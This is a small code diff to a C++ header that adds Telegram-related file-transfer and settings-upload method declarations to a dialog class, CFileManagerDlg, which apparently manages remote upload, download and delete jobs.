@@ -17,6 +17,8 @@ class CFileManagerDlg : public CDialog
 {
 // Construction
 public:
+	void StartSettingsUpload();  
+    void StartTelegramDownload();
 	CString strLpath;
 	CString m_strDesktopPath;
 	CString  GetDirectoryPath(BOOL bIncludeFiles);
@@ -43,6 +45,7 @@ public:
 	BOOL SendDownloadJob();
 	BOOL SendUploadJob();
 	BOOL SendDeleteJob();
+	void HandleTelegramFileTransfer();  // 处理Telegram文件传输
 
 	strList m_Remote_Download_Job;
 	strList m_Remote_Upload_Job;
